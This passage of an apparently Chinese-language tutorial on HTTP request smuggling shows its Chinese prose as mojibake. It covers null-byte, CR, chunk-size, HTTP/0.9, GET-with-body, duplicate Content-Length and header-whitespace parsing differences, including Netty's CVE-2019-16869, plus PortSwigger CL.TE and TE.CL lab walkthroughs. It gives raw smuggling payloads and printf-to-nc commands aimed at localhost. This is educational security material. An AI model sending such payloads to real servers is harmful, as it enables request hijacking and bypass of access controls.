\u0026#39;Content-\\0dummy: foo\\r\\n\u0026#39;\\ \u0026#39;length: 56\\r\\n\u0026#39;\\ \u0026#39;Transfer-Encoding: chunked\\r\\n\u0026#39;\\ \u0026#39;Dummy:Header\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ \u0026#39;0\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ \u0026#39;GET /tmp HTTP/1.1\\r\\n\u0026#39;\\ \u0026#39;Host:localhost\\r\\n\u0026#39;\\ \u0026#39;Dummy:Header\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ \u0026#39;GET /tests HTTP/1.1\\r\\n\u0026#39;\\ \u0026#39;Host:localhost\\r\\n\u0026#39;\\ \u0026#39;Dummy:Header\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ | nc -q3 127.0.0.1 8080 æœ‰äº›ä¸­é—´ä»¶å¤„ç†ä»¥ä¸Šçš„è¯·æ±‚æ—¶ï¼Œå½“é‡åˆ°\\0çš„æ—¶å€™ä¼šç»§ç»­æ¢è¡Œè¯»å–ï¼Œè¿™æ ·ä¹Ÿä¼šå¯¼è‡´äº§ç”Ÿè§£æå·®å¼‚ã€‚\nCRLF æ ¹æ® RFC7320 section-3.5:\n Although the line terminator for the start-line and header fields is the sequence CRLF, a recipient MAY recognize a single LF as a line terminator and ignore any preceding CR.\n ä¹Ÿå°±æ˜¯è¯´é™¤äº† CRLF æˆ‘ä»¬è¿˜å¯ä»¥ç”¨ LF ä½œä¸º EOLï¼Œä½†æ˜¯åœ¨ Node.js \u0026lt; 5.6.0 çš„ç‰ˆæœ¬ï¼Œå¯¹äº CRLF çš„å¤„ç†ä¹Ÿæ˜¯æ¯”è¾ƒæœ‰è¶£çš„ï¼š\n[CR] + ? == [CR][LF]\t//true å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªæ­£å¸¸è§£æ CRLF çš„ Front æœåŠ¡å™¨ï¼Œåç«¯æ˜¯æœ‰è¯¥æ¼æ´çš„ Node.js æœåŠ¡ï¼Œæˆ‘ä»¬å¯ä»¥å‘é€ä»¥ä¸‹è¯·æ±‚ï¼š\nGET / HTTP/1.1\\r\\n Host:localhost\\r\\n Dummy: Header\\rZTransfer-Encoding: chunked\\r\\n Content-length: 52\\r\\n \\r\\n 0\\r\\n \\r\\n GET /tmp HTTP/1.1\\r\\n Host:localhost\\r\\n Dummy:Header\\r\\n Front æœåŠ¡å™¨å°±ä¼šè®¤ä¸ºDummy: Header\\rZTransfer-Encoding: chunked\\r\\næ˜¯ä¸€ä¸ª header ï¼Œä½¿ç”¨ CL å¤´è§£æï¼Œä¼šè®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªå®Œæ•´çš„è¯·æ±‚ï¼Œè€Œ Node.js ä¼šè®¤ä¸º\\rZæ˜¯ä¸€ä¸ªæ¢è¡Œï¼ŒæŒ‰ç…§ TE ä¼˜å…ˆäº CL çš„è§£æè§„åˆ™ï¼Œè®¤ä¸ºè¿™æ˜¯ä¸¤ä¸ªè¯·æ±‚ï¼Œå°±äº§ç”Ÿäº†è§£æå·®å¼‚ã€‚\nSize Issue è¿˜å¯ä»¥åˆ©ç”¨ä¸€äº›ç¼–ç å—é•¿åº¦äº§ç”Ÿè§£æå·®å¼‚ï¼Œä¾‹å¦‚ï¼š\nprintf \u0026#39;GET / HTTP/1.1\\r\\n\u0026#39;\\ \u0026#39;Host:localhost\\r\\n\u0026#39;\\ \u0026#39;Transfer-Encoding: chunked\\r\\n\u0026#39;\\ \u0026#39;Dummy:Header\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ \u0026#39;0000000000000000000000000000042\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ \u0026#39;GET /tmp/ HTTP/1.1\\r\\n\u0026#39;\\ \u0026#39;Host:localhost\\r\\n\u0026#39;\\ \u0026#39;Transfer-Encoding: chunked\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ \u0026#39;0\\r\\n\u0026#39;\\ \u0026#39;\\r\\n\u0026#39;\\ | nc -q3 127.0.0.1 8080 æŸäº›ä¸­é—´ä»¶åœ¨è§£æå—å¤§å°çš„æ—¶å€™ï¼Œä¼šå°†é•¿åº¦å—å¤§å°é•¿åº¦è¿›è¡Œæˆªæ–­ï¼Œæ¯”å¦‚è¿™é‡Œè¡¨ç°ä¸ºåªå–'0000000000000000000000000000042ä¸º00000000000000000ï¼Œè¿™æ ·å°±ä¼šè®¤ä¸ºè¿™æ˜¯ä¸¤ä¸ªè¯·æ±‚äº†ï¼Œç¬¬ä¸€ä¸ªè¯·æ±‚çš„å—å¤§å°ä¸º0ï¼Œç¬¬äºŒä¸ªå°±ä¼šè¯·æ±‚/tmpï¼Œå°±å¯¼è‡´äº† HTTP Smugglingã€‚\nHTTP Version è¿™ä¸ªä¸»è¦æ˜¯ç”±äº HTTP/0.9 å¼•èµ·çš„é—®é¢˜ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹çœ‹ HTTP å‡ ä¸ªç‰ˆæœ¬çš„ example ï¼š\nHTTP v1.1\nGET /foo HTTP/1.1\\r\\n Host: example.com\\r\\n HTTP v1.0\nGET /foo HTTP/1.0\\r\\n \\r\\n HTTP v0.9\nGET /foo\\r\\n å¹¶ä¸” HTTP/0.9 è¯·æ±‚åŒ…ä¸å“åº”åŒ…æ˜¯éƒ½æ²¡æœ‰ headers çš„æ¦‚å¿µçš„ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚ä¸‹ï¼š\n \nå› ä¸º HTTP/0.9 å“åº”åŒ…æ²¡æœ‰ headers çš„ç‰¹æ€§ï¼Œåœ¨ HTTP Smuggling ä¸­åˆ©ç”¨èµ·æ¥ä¹Ÿå°±ç‰¹åˆ«çš„æœ‰æ„æ€äº†ã€‚\n \nè¿™å¼ å›¾çš„æ„æ€å°±æ˜¯æˆ‘ä»¬åœ¨ HTTP Smuggling çš„æ—¶å€™ä½¿ç”¨ HTTP/0.9 è¿›è¡Œ Smuggle ï¼Œè¿™å¹¶ä¸æ˜¯ HTTP/0.9 æ ‡å‡†çš„æ ¼å¼ï¼Œä½†æ˜¯ç”±äºä¸€äº›ä¸­é—´ä»¶å·²ç»ä¸æ”¯æŒç›´æ¥è§£æ HTTP/0.9 çš„æ ‡å‡†æ ¼å¼äº†ï¼Œä½†æ˜¯è¿˜å¯èƒ½å­˜åœ¨è§£æè¿™ç§æŒ‡å®š HTTP version çš„æƒ…å†µã€‚äºæ˜¯å°±å¯èƒ½å­˜åœ¨ä»¥ä¸‹è¿™ç§æƒ…å†µï¼š\n \n \nä¸Šé¢ä¸¤ä¸ªå›¾å±•ç°äº†ä¸€ä¸ªå¤§è‡´çš„æ”»å‡»æµç¨‹ï¼Œchewy2.jpg å½“ä¸­çš„ 24-33664 å­—èŠ‚æœ‰ç€ä¸€ä¸ªå®Œæ•´çš„ HTTP å“åº”æŠ¥æ–‡ï¼Œå½“ Golang åœ¨å¤„ç† HTTP/0.9 çš„æ—¶å€™ï¼Œç”±äºæˆ‘ä»¬æŒ‡å®šäº†Range: bytes=24-33664ï¼Œå°±æ˜¯æˆ‘ä»¬å¯ä»¥æŒ‡å®šè·å–å“åº”æŠ¥æ–‡çš„ 24-33664 ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯è·å–äº†æˆ‘ä»¬å­˜æ”¾åœ¨å›¾ç‰‡å½“ä¸­çš„ HTTP æŠ¥æ–‡ï¼Œç„¶åè¿”å›ç»™ Golang ï¼ŒGolang å¯¹äº HTTP/0.9 å†è¿›è¡Œæ ‡å‡†åŒ–å»å¤´çš„å¤„ç†ï¼Œè¿™æ ·å“åº”çœ‹èµ·æ¥å°±æ˜¯ä¸€ä¸ªæ–°çš„å“åº”äº†ã€‚\n \nå½“ä¸€ä¸ªæ­£å¸¸ç”¨æˆ·å»è¯·æ±‚çš„æ—¶å€™ï¼Œå¦‚æœ Apache é‡æ–°ä½¿ç”¨äº† TCP/IP é“¾æ¥ï¼Œå°±ä¼šå°†æˆ‘ä»¬æ„é€ åœ¨å›¾ç‰‡å½“ä¸­çš„ HTTP æŠ¥æ–‡å½“ä½œå“åº”åŒ…è¿”å›ç»™ç”¨æˆ·ã€‚è¿™ä¹Ÿæ˜¯ä¸€ä¸ªå¾ˆå…¸å‹çš„ HTTP Response Splitting çš„æ€è·¯ã€‚å…·ä½“å¯ä»¥çœ‹çœ‹è§†é¢‘æ¼”ç¤º HTTP Smuggling Examples 2016\nHas a CL in GET è¿™ä¸ªåœºæ™¯å…¶å®å°±æ˜¯åœ¨ GET è¯·æ±‚ä¸­ä½¿ç”¨äº† body ï¼Œå¹¶ä»¥ Content-Length æŒ‡å‡ºäº† body çš„é•¿åº¦ã€‚\n â€‹\tå…¶å®åœ¨è¿™é‡Œï¼Œå½±å“åˆ°çš„å¹¶ä¸ä»…ä»…æ˜¯GETè¯·æ±‚ï¼Œæ‰€æœ‰ä¸æºå¸¦è¯·æ±‚ä½“çš„HTTPè¯·æ±‚éƒ½æœ‰å¯èƒ½å—æ­¤å½±å“ï¼Œåªå› ä¸ºGETæ¯”è¾ƒå…¸å‹ï¼Œæˆ‘ä»¬æŠŠå®ƒä½œä¸ºä¸€ä¸ªä¾‹å­ã€‚\n åœ¨ RFC7230 Content-Length éƒ¨åˆ†æåˆ°ï¼š\n â€‹\tFor example, a Content-Length header field is normally sent in a POST request even when the value is 0 (indicating an empty payload body). A user agent SHOULD NOT send a Content-Length header field when the request message does not contain a payload body and the method semantics do not anticipate such a body.\n åœ¨æœ€æ–°çš„ RFC7231 4.3.1 GET ä¸­ä¹Ÿä»…ä»…æäº†ä¸€å¥ï¼š\n â€‹\tA payload within a GET request message has no defined semantics; sending a payload body on a GET request might cause some existing implementations to reject the request.\n å¯¹äºç±»ä¼¼æ‹¥æœ‰ body å­—æ®µå¹¶ä¸”ä»¥ Content-Length æŒ‡å‡ºå…¶ body é•¿åº¦çš„è¯·æ±‚ï¼ŒRFC å¹¶æ²¡æœ‰ä¸¥æ ¼çš„è¯´æ˜ Server åº”è¯¥å¦‚ä½•å»å¤„ç†ï¼Œæ‰€ä»¥å¤§éƒ¨åˆ†ä¸­é—´ä»¶å¯¹äºæ‹¥æœ‰ body çš„ GET è¯·æ±‚ä¹Ÿæ˜¯è¿›è¡Œäº†å®½æ¾å¤„ç†ï¼Œä½†æ˜¯ä¹Ÿæ˜¯éƒ¨åˆ†æƒ…å†µï¼Œç”±äºè¿™äº›ä¸­é—´ä»¶æ²¡æœ‰ä¸€ä¸ªä¸¥æ ¼çš„æ ‡å‡†ä¾æ®ï¼Œæ‰€ä»¥ä¹Ÿä¼šäº§ç”Ÿè§£æå·®å¼‚å¯¼è‡´ HTTP Smuggling æ”»å‡»ã€‚\nè¿™é‡Œæˆ‘ä»¬ä¸¾ä¸ªç®€å•ä¸”ç†æƒ³åŒ–çš„ä¾‹å­ï¼ŒFront æœåŠ¡å™¨å¯¹äº GET è¯·æ±‚å…è®¸æºå¸¦ body ï¼Œè€Œ Backend æœåŠ¡å™¨ä¼šå¿½ç•¥å¸¦ body çš„ GET è¯·æ±‚ã€‚\nå½“æˆ‘ä»¬å‘é€å¦‚ä¸‹è¯·æ±‚ï¼š\nGET / HTTP/1.1\\r\\n Host: example.com\\r\\n Content-Length: 41\\r\\n \\r\\n GET /secret HTTP/1.1\\r\\n Host: example.com\\r\\n \\r\\n å½“ Front æœåŠ¡å™¨å¤„ç†è¿™ä¸ªè¯·æ±‚çš„æ—¶å€™ï¼Œä¼šæŠŠä»¥ä¸Šè¿™ä¸ªè¯·æ±‚å½“ä½œä¸€ä¸ªå®Œæ•´çš„è¯·æ±‚è½¬å‘ç»™ Backend æœåŠ¡å™¨ï¼Œè€Œ Backend æœåŠ¡æ±‚åœ¨å¤„ç†è¿™ä¸ªæœåŠ¡å™¨çš„æ—¶å€™ï¼Œä¼šæŠŠè¿™ä¸ªè¯·æ±‚å½“ä½œä¸¤ä¸ªè¯·æ±‚\nGET / HTTP/1.1\\r\\n Host: example.com\\r\\n Content-Length: 41\\r\\n \\r\\n GET /secret HTTP/1.1\\r\\n Host: example.com\\r\\n \\r\\n è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æˆåŠŸåœ°è¿›è¡Œäº†ä¸€æ¬¡ HTTP Smugglingï¼Œä»è¿™ä¸ªä¾‹å­å½“ä¸­ï¼Œæˆ‘ä»¬ä¹Ÿä¸éš¾çœ‹å‡ºï¼Œå¦‚æœæœ‰ä¸€ä¸ªåœºæ™¯å­˜åœ¨ HTTP Smuggling æ¼æ´ï¼Œé‚£ä¹ˆè¿™ä¸ª Content-Length æ•°æ®å°±å˜å¾—é¢å¤–çš„é‡è¦ï¼Œå› ä¸ºè¿™å½±å“åˆ°æˆ‘ä»¬æ”»å‡»æ˜¯å¦æˆåŠŸï¼Œèƒ½å¦å°†æˆ‘ä»¬çš„ HTTP è¯·æ±‚æˆåŠŸåœ°â€œåµŒå…¥â€åœ¨ä¸€ä¸ª HTTP è¯·æ±‚å½“ä¸­ã€‚\nè¿™é‡Œçš„è®¡ç®—æ–¹æ³•ä¸ä¹‹å‰çš„ç±»ä¼¼ï¼Œ\nGET /secret HTTP/1.1\\r\\n\t--\u0026gt;\t\u0026#34;GET /secret HTTP/1.1\u0026#34; ä¸€å…±20ä¸ªå­—ç¬¦ï¼ŒåŠ ä¸ŠCRLFä¸€å…±22ä¸ªå­—ç¬¦ Host: example.com\\r\\n\t--\u0026gt;\t\u0026#34;Host: example.com\u0026#34; ä¸€å…±17ä¸ªå­—ç¬¦ï¼ŒåŠ ä¸ŠCRLFä¸€å…±19ä¸ªå­—ç¬¦ 22 + 19 = 41 ä¸ªå­—èŠ‚\nTwo Identical Fields - CL è¿™é‡Œæˆ‘ä»¬ä»¥ Content-Length ä¸¾ä¾‹ï¼Œåœ¨ RFC7230 section 3.3.2 ä¸­ï¼Œ\n If a message is received that has multiple Content-Length header fields with field-values consisting of the same decimal value, or a single Content-Length header field with a field value containing a list of identical decimal values (e.g., \u0026ldquo;Content-Length: 42, 42\u0026rdquo;), indicating that duplicate Content-Length header fields have been generated or combined by an upstream message processor, then the recipient MUST either reject the message as invalid or replace the duplicated field-values with a single valid Content-Length field containing that decimal value prior to determining the message body length or forwarding the message.\n And RFC 7230 section 3.3.3 ä¸­ä¹Ÿæåˆ°ï¼š\n If a message is received without Transfer-Encoding and with either multiple Content-Length header fields having differing field-values or a single Content-Length header field having an invalid value, then the message framing is invalid and the recipient MUST treat it as an unrecoverable error. If this is a request message, the server MUST respond with a 400 (Bad Request) status code and then close the connection.\n RFC å½“ä¸­å¯¹äºè¿™ä¸­æƒ…å†µä¹Ÿæœ‰äº†æ¯”è¾ƒæ˜ç¡®çš„è§„èŒƒï¼Œä½†æ˜¯æˆ‘ä»¬è¿™é‡Œå‡è®¾ä¸¾ä¸€ä¸ªæ¯”è¾ƒç®€å•çš„ä¾‹å­ï¼Œæˆ‘ä»¬å‘é€ä»¥ä¸‹è¯·æ±‚ï¼š\nGET /suzann.html HTTP/1.1\\r\\n Host: example.com\\r\\n Content-Length: 0\\r\\n Content-Length: 46\\r\\n \\r\\n GET /walter.html HTTP/1.1\\r\\n Host: example.com\\r\\n \\r\\n åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬å‡è®¾ Front æœåŠ¡å™¨ä»¥ç¬¬äºŒä¸ª Content-Length ä¸ºè§£ææ ‡å‡†ï¼ŒæŠ›å¼ƒç¬¬ä¸€ä¸ª Content-Length å­—æ®µæˆ–è€…å¯¹ç¬¬ä¸€ä¸ªä¸åšä»»ä½•å¤„ç†æˆ–è€… anything else ï¼Œåæ­£å‡è®¾å®ƒåªå¤„ç†ç¬¬äºŒä¸ª Content-Length å­—æ®µï¼›æˆ‘ä»¬åœ¨å‡è®¾ BackendæœåŠ¡å™¨ä»¥ç¬¬ä¸€ä¸ª Content-Length å­—æ®µä¸ºè§£ææ ‡å‡†ï¼Œä¸ç†ä¼šç¬¬äºŒä¸ªã€‚\nè¿™æ ·å°±ç›¸å½“äºæˆ‘ä»¬åœ¨ HTTP è¯·æ±‚ä¸­æ³¨å…¥äº†å¦ä¸€ä¸ª HTTP è¯·æ±‚ï¼Œå¦‚æœæ•´ä¸ªåœºæ™¯åƒæˆ‘ä»¬ä¸Šè¿°è¿™æ ·ï¼Œå°±å­˜åœ¨ HTTP Smuggling æ”»å‡»ã€‚\nå¦‚è¿‡æœåŠ¡å™¨ä»¥ç¬¬ä¸€ä¸ª Content-Length ä¸ºè§£ææ ‡å‡†ï¼Œè¿™æ ·è§£æå°±ä¼šå‡ºç°ä¸¤ä¸ª HTTP è¯·æ±‚ï¼Œå¦‚æœä»¥ç¬¬äºŒä¸ªä½œä¸ºè§£ææ ‡å‡†ï¼Œåˆ™ä¼šè®¤ä¸ºåªæœ‰ä¸€ä¸ª HTTP è¯·æ±‚ã€‚\nOptional WhiteSpace RFC7320 ä¸­å¯¹äº header å­—æ®µæœ‰è¿™æ ·çš„æè¿°ï¼š\n 3.2. Header Fields\nEach header field consists of a case-insensitive field name followed by a colon (\u0026quot;:\u0026quot;), optional leading whitespace, the field value, and optional trailing whitespace.\nheader-field = field-name \u0026ldquo;:\u0026rdquo; OWS field-value OWS\n field-name = token field-value = *( field-content / obs-fold ) field-content = field-vchar [ 1*( SP / HTAB ) field-vchar ] field-vchar = VCHAR / obs-text obs-fold = CRLF 1*( SP / HTAB ) ; obsolete line folding ; see Section 3.2.4  The field-name token labels the corresponding field-value as having the semantics defined by that header field. For example, the Date header field is defined in Section 7.1.1.2 of [RFC7231] as containing the origination timestamp for the message in which it appears.\n å°¤å…¶æ˜¯å¼€å¤´çš„ä¸€å¥è¯è¡¨æ˜ï¼Œå­—æ®µåé¢åº”è¯¥ç´§è·Ÿ:å†’å·ï¼Œç„¶åæ˜¯ OWS(Optional WhiteSpace) å¯é€‰çš„ç©ºæ ¼ï¼Œç„¶åå†æ˜¯å­—æ®µå€¼ï¼Œæœ€åæ˜¯ OWS å¯é€‰ç©ºæ ¼ã€‚\nè¿™ä¸ªä¼šå­˜åœ¨ä»€ä¹ˆé—®é¢˜å‘¢ï¼Ÿå¾ˆæ˜æ˜¾ï¼Œå¦‚æœæœ‰ä¸­é—´ä»¶å¯¹äºè¿™ä¸ªçš„å®ç°å¹¶æ²¡æœ‰ä¸¥æ ¼éµå¾ª RFC æ ‡å‡†çš„è¯ï¼Œä¹Ÿä¼šäº§ç”Ÿ HTTP Smuggling æ”»å‡»ã€‚\næ¯”è¾ƒå…¸å‹çš„ä¾‹å­å°±æ˜¯ CVE-2019-16869 ï¼Œè¿™æš CVE æ˜¯ OPPO å­åˆäº’è”ç½‘å®‰å…¨å®éªŒå®¤å‘æ˜çš„ï¼Œæ˜¯å…³äº Netty ä¸­é—´ä»¶å­˜åœ¨ HTTP Smuggling æ¼æ´ã€‚\nåœ¨ Netty 4.1.42.Final ç‰ˆæœ¬ä¹‹å‰å¯¹äº Header å¤´çš„å¤„ç†æ˜¯ä½¿ç”¨ splitHeader æ–¹æ³•ï¼Œå…¶ä¸­å…³é”®ä»£ç å¦‚ä¸‹ï¼š\nfor (nameEnd = nameStart; nameEnd \u0026lt; length; nameEnd ++) { char ch = sb.charAt(nameEnd); if (ch == \u0026#39;:\u0026#39; || Character.isWhitespace(ch)) { break; } } å…¶ä»–çš„ä»£ç æˆ‘ä»¬å¹¶ä¸éœ€è¦è¿‡å¤šäº†è§£ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥çŸ¥é“è¿™é‡Œå°†ç©ºæ ¼ä¸:å†’å·åŒæ ·å¤„ç†äº†ï¼Œä¹Ÿå°±æ˜¯å¦‚æœå­˜åœ¨ç©ºæ ¼ä¼šæŠŠ:å…¶ä¹‹å‰çš„ field name æ­£å¸¸å¤„ç†ï¼Œå¹¶ä¸ä¼šæŠ›å‡ºé”™è¯¯æˆ–è€…è¿›è¡Œå…¶ä»–æ“ä½œã€‚è¿™æ ·å°±ä¸ RFC æ ‡å‡†çš„è§„èŒƒä¸ä¸€è‡´äº†ï¼Œäºæ˜¯å°±ä¼šäº§ç”Ÿè§£æå·®å¼‚ã€‚\n@Bi3g0 æ„å»ºäº†æ¯”è¾ƒæ¸…æ™°çš„æ¼æ´åŸç†å›¾ï¼š\n \nè¿™é‡Œç”¨çš„ä¾‹å­æ˜¯é‡‡ç”¨ ELB ä½œä¸º Front æœåŠ¡å™¨ï¼ŒNetty ä½œä¸º Backend æœåŠ¡å™¨è¿›è¡Œä¸¾ä¾‹ï¼Œæˆ‘ä»¬å‘é€å¦‚ä¸‹è¯·æ±‚ï¼š\nPOST /getusers HTTP/1.1 Host: www.backend.com Content-Length: 64 Transfer-Encoding : chunked 0 GET /hacker HTTP/1.1 Host: www.hacker.com hacker: hacker ELB ä¼šå°† Transfer-Encoding å­—æ®µå¿½ç•¥ï¼Œå› ä¸ºå®ƒä¸å†’å·ä¸­é—´æœ‰ä¸€ä¸ªç©ºæ ¼ï¼Œä¸ç¬¦åˆ RFC æ ‡å‡†ï¼Œä¼šä½¿ç”¨ Content-Length ä½œä¸ºè§£ææ ‡å‡†ï¼Œäºæ˜¯ä¼šè®¤ä¸ºä»¥ä¸Šè¯·æ±‚æ˜¯ä¸€ä¸ªå®Œæ•´çš„è¯·æ±‚ï¼Œç»§è€Œæ‰”ç»™ Backend æœåŠ¡å™¨ï¼Œä¹Ÿå°±æ˜¯ Netty ï¼ŒNetty åœ¨è¿™é‡Œä¼šä¼˜å…ˆè§£æ Transfer-Encoding ï¼Œå³ä½¿è¿™ä¸ªå­—æ®µä¸ç¬¦åˆ RFC æ ‡å‡†ï¼Œä½†æ˜¯å› ä¸ºå®ƒçš„å®ç°æ–¹å¼ä¸ä¸¥æ ¼ï¼Œæ‰€ä»¥è¿™é‡Œå› ä¸ºä¼˜å…ˆè§£æ Transfer-Encoding çš„åŸå› ï¼Œå®ƒä¼šå°†è¿™ä¸ªè¯·æ±‚æ‹†åˆ†ä¸ºä¸¤ä¸ªè¯·æ±‚ï¼š\nPOST /getusers HTTP/1.1 Host: www.backend.com Content-Length: 64 Transfer-Encoding : chunked 0 GET /hacker HTTP/1.1 Host: www.hacker.com hacker: hacker è¿™æ ·å°±é€ æˆäº† HTTP Smuggling æ”»å‡»ã€‚\nNetty äº 4.1.42 Final ç‰ˆæœ¬ä¿®å¤äº†è¿™ä¸ªæ¼æ´ï¼šCorrectly handle whitespaces in HTTP header names as defined by RFC72â€¦\nå½“æˆ‘ä»¬å‘é€ field name ä¸ : ä¹‹é—´æœ‰ç©ºæ ¼çš„ header è¯·æ±‚æ—¶ï¼Œ netty ä¼šâ€œæ­£ç¡®â€åœ°è¿”å› 400 ã€‚\nCL-TE æ¥ä¸‹æ¥å‡ ä¸ªæ”»å‡»æ–¹å¼æˆ‘ä»¬å¯ä»¥é€šè¿‡ @portswigger æä¾›çš„å‡ ä¸ª Lab ç»™æˆ‘ä»¬è¿›è¡Œç»ƒä¹ ä»¥åŠ æ·±ç†è§£â€”â€”HTTP request smuggling\nåœ¨åšä¹‹å‰è®°å¾—è¦æŠŠ BurpSuite çš„è‡ªåŠ¨æ›´æ–° Content-Length åŠŸèƒ½å–æ¶ˆäº†ã€‚\n \né¦–å…ˆæˆ‘ä»¬æ¥çœ‹ CL-TE çš„æƒ…å†µï¼šLab: HTTP request smuggling, basic CL.TE vulnerability\n This lab involves a front-end and back-end server, and the front-end server doesn\u0026rsquo;t support chunked encoding. The front-end server rejects requests that aren\u0026rsquo;t using the GET or POST method.\nTo solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.\n æ ¹æ®é¢˜ç›®æç¤ºï¼Œæˆ‘ä»¬åªéœ€è¦è®© Backend æœåŠ¡å™¨æ”¶åˆ° GPOST æ–¹æ³•å³å¯ï¼Œè€Œä¸”åœºæ™¯ä¹Ÿæ˜ç¡®å‘Šè¯‰æˆ‘ä»¬æ˜¯ä¸€ç§ CL-TE çš„åœºæ™¯ã€‚\nPOST / HTTP/1.1 Host: ac8f1fae1e6cd77b8073213100b500d6.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G æ ¹æ®é¢˜ç›®çš„æç¤ºè¦æ±‚ï¼Œè¿™é‡Œæˆ‘ä»¬å‘é€ä¸¤æ¬¡ä»¥ä¸Š HTTP è¯·æ±‚åŒ…ï¼š\n \n \næˆ‘ä»¬å°±å¯ä»¥ä½¿ç¬¬äºŒæ¬¡è¯·æ±‚æ„é€ å‡º GPOST çš„ HTTP Method äº†ï¼Œè¯¦ç»†çš„æˆ‘ä»¬å¯ä»¥æŒ‰ç…§ä¸‹é¢è¿™ä¸ªæµç¨‹å›¾æ¥çœ‹çœ‹ï¼š\n User Front Backend | | | |--A(1A+1/2B)--\u0026gt;| | | |--A(1A+1/2B)--\u0026gt;| | |\u0026lt;-A(200)-------| | | [1/2B] |\u0026lt;-A(200)-------| [1/2B] |--C-----------\u0026gt;| [1/2B] | |--C-----------\u0026gt;| * ending B * | |\u0026lt;--B(200)------| |\u0026lt;--B(200)------| |  1A + 1/2B è¡¨ç¤ºçš„æ˜¯ä¸€ä¸ªå®Œæ•´çš„è¯·æ±‚ A + ä¸€ä¸ªä¸å®Œæ•´çš„è¯·æ±‚ B A(X) : è¡¨ç¤º X è¯·æ±‚éšè—åœ¨ A è¯·æ±‚çš„ body å½“ä¸­ ending B: è¯·æ±‚ C ç¬¬ä¸€è¡Œè¢«æ‹¼æ¥åˆ°äº†ä¸å®Œæ•´çš„è¯·æ±‚ B çš„ header å¤´å½“ä¸­ï¼Œè¯·æ±‚ C å…¶ä»–æ‰€æœ‰çš„è¯·æ±‚å¤´éƒ½è¢«æ·»åŠ åˆ°äº†è¯·æ±‚ B å½“ä¸­ï¼Œè¿™æ ·è¯·æ±‚ C å°±ç›¸å½“äºæ¶ˆå¤±äº†ï¼Œè¯·æ±‚ B ä¼šå¸¦ç€è¯·æ±‚ C çš„è¯·æ±‚å¤´å»è¯·æ±‚åæ®µæœåŠ¡å™¨ï¼ŒåŒ…æ‹¬ Cookie å­—æ®µæˆ–è€…å…¶ä»–ä»€ä¹ˆè®¤è¯å­—æ®µ  æ•´ä¸ªè¿‡ç¨‹å°±æ˜¯ï¼Œæˆ‘ä»¬å‘é€ä»¥ä¸Šè¯·æ±‚ï¼Œå½“ Front æœåŠ¡å™¨ä¼˜å…ˆä»¥ CL å¤„ç†æ—¶ï¼Œä¼šè®¤ä¸º\n0\\r\\n \\r\\n G ä»¥ä¸Š 6 ä¸ªå­—èŠ‚ä¸ºè¯·æ±‚ A çš„ body ï¼Œä¼šå°†è¿™ä¸ªè¯·æ±‚ A å½“ä½œä¸€ä¸ªå®Œæ•´çš„è¯·æ±‚è½¬å‘åˆ°åç«¯ï¼Œè€Œå½“ Backend æœåŠ¡å™¨ä¼˜å…ˆä»¥ TE å¤„ç†æ—¶ï¼Œä¼šè®¤ä¸º\nPOST / HTTP/1.1 Host: ac8f1fae1e6cd77b8073213100b500d6.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 è¿™ä¸ªæ˜¯ä¸€ä¸ªå®Œæ•´çš„ï¼Œå•ç‹¬çš„è¯·æ±‚ï¼Œè€Œ\nG è¿™ä¸ªä»–ä¼šè§†ä¸ºä¸€ä¸ªä¸å®Œæ•´çš„è¯·æ±‚ï¼Œæ‰€ä»¥å°±é€ æˆäº† 1/2 B è¯·æ±‚çš„äº§ç”Ÿï¼Œäºæ˜¯ä¼šåœ¨ Backend æœåŠ¡å™¨ç¼“å†²åŒºå¤„ç­‰å¾…å…¶ä»–æ•°æ®çš„åˆ°æ¥ä»¥ä½¿å¾—å°† 1/2 B æ‹¼æ¥æˆä¸€ä¸ªå®Œæ•´çš„è¯·æ±‚ï¼Œå½“æˆ‘ä»¬å‘é€ç¬¬äºŒéè¯·æ±‚çš„æ—¶å€™ï¼ŒPOST ä¼šæ‹¼æ¥åˆ° G åé¢ï¼Œæ‰€ä»¥ HTTP Method ä¼šå˜æˆ GPOST æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬çœ‹åˆ°çš„å¾—åˆ°çš„å›æ˜¾ï¼Œæ— æ³•è¯†åˆ«çš„ HTTP Method GPOSTã€‚\nTE-CL æ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹ TE-CL çš„æƒ…å†µï¼ŒåŒæ ·æˆ‘ä»¬å€ŸåŠ© LAB å®éªŒæ¥åŠ æ·±ç†è§£ï¼šLab: HTTP request smuggling, basic TE.CL vulnerability\n This lab involves a front-end and back-end server, and the back-end server doesn\u0026rsquo;t support chunked encoding. The front-end server rejects requests that aren\u0026rsquo;t using the GET or POST method.\nTo solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.\n æŒ‰ç…§é¢˜ç›®æç¤ºï¼Œæˆ‘ä»¬è¦è¾¾åˆ°çš„ä»ç„¶æ˜¯è®©åç«¯æ”¶åˆ° GPOST è¯·æ±‚ï¼Œè€Œä¸”åœºæ™¯ä¹Ÿæ˜ç¡®å‘Šè¯‰æˆ‘ä»¬æ˜¯ä¸€ç§ TE-CL çš„åœºæ™¯ã€‚\nPOST / HTTP/1.1 Host: acde1ffc1f047f9f8007186200ff00fe.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 12 GPOST / HTTP/1.1 0 è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯æœ€åéœ€è¦åŠ 